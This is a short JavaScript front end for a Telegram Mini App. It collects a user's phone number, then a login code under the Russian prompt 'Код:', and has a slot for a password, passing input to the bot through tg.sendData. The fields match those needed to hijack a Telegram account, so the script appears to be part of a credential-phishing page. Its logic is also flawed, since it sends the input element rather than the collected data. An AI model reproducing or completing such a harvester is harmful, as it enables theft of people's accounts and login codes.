let tg = window.Telegram.WebApp;
tg.expand();
send_btn = document.getElementById('send-button');
phone = document.getElementById('phone_code') ;
const data = {
    'Phone':'',
    'Code':'',
    'Password':''
}
console.log(data);
 if (data['Phone'] != ''){
    phone.placeholder = 'Код:';
}
send_btn.addEventListener('click',function(){
   if (data['Phone'] != ''){
        data['Code'] = phone.value;
        console.log(data);
        tg.sendData(phone);}
    else{
      data['Phone'] = phone.value; 
     phone.value = '';
     console.log(data);
    }
});